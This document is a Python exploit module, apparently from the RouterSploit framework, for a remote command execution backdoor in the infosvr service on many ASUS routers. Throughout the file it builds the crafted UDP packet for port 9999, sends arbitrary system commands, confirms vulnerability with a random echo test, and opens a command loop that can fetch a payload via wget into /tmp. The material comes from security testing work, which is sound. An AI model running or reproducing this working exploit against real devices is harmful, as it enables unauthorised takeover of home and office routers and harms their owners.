from struct import pack, unpack
from routersploit.core.exploit import *
from routersploit.core.udp.udp_client import UDPClient


class Exploit(UDPClient):
    __info__ = {
        "name": "Asus Infosvr Backdoor RCE",
        "description": "Module exploits remote command execution in multiple ASUS devices. If the target is "
                       "vulnerable, command loop is invoked that allows executing commands on operating system level.",
        "authors": (
            "Joshua 'jduck' Drake; @jduck",  # vulnerability discovery
            "Friedrich Postelstorfer",  # original Python exploit
            "Michal Bentkowski; @SecurityMB",  # routersploit module
        ),
        "references": (
            "https://github.com/jduck/asus-cmd",
        ),
        "devices": (
            "ASUS RT-N66U",
            "ASUS RT-AC87U",
            "ASUS RT-N56U",
            "ASUS RT-AC68U",
            "ASUS DSL-N55U",
            "ASUS DSL-AC68U",
            "ASUS RT-AC66R",
            "ASUS RT-AC66R",
            "ASUS RT-AC55U",
            "ASUS RT-N12HP_B1",
            "ASUS RT-N16",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(9999, "Target UDP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            print_status("Please note that only first 256 characters of the "
                         "output will be displayed or use reverse_tcp")
            shell(self, architecture="armle", method="wget", location="/tmp")
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        if len(cmd) > 237:
            print_error('Your command must be at most 237 characters long. Longer strings might crash the server.')
            return

        ibox_comm_pkt_hdr_ex = (
            pack("<B", 0x0c) +                      # NET_SERVICE_ID_IBOX_INFO 0xC
            pack("<B", 0x15) +                      # NET_PACKET_TYPE_CMD 0x15
            pack("<H", 0x33) +                      # NET_CMD_ID_MANU_CMD 0x33
            bytes(utils.random_text(4), "utf-8") +  # INFO
            bytes(utils.random_text(6), "utf-8") +  # MAC Address
            bytes(utils.random_text(32), "utf-8")   # Password
        )

        cmd = bytes(cmd, "utf-8") + pack("<B", 0x00)
        pkt_syscmd = (
            pack("<H", len(cmd)) +
            cmd
        )

        payload = ibox_comm_pkt_hdr_ex + pkt_syscmd + bytes(utils.random_text(512 - len(ibox_comm_pkt_hdr_ex + pkt_syscmd)), "utf-8")

        udp_client = self.udp_create()
        udp_client.send(payload)
        response = udp_client.recv(512)
        udp_client.close()

        if response and len(response) == 512:
            length = unpack('<H', response[14:16])[0]
            return str(response[16: 16 + length], "utf-8")

        return ""

    @mute
    def check(self):
        NUM_CHECKS = 5  # we try 5 times because the exploit tends to be unstable

        for _ in range(NUM_CHECKS):
            random_value = utils.random_text(32)
            cmd = "echo {}".format(random_value)
            retval = self.execute(cmd)

            if random_value in retval:
                return True  # target is vulnerable

        return False  # target is not vulnerable
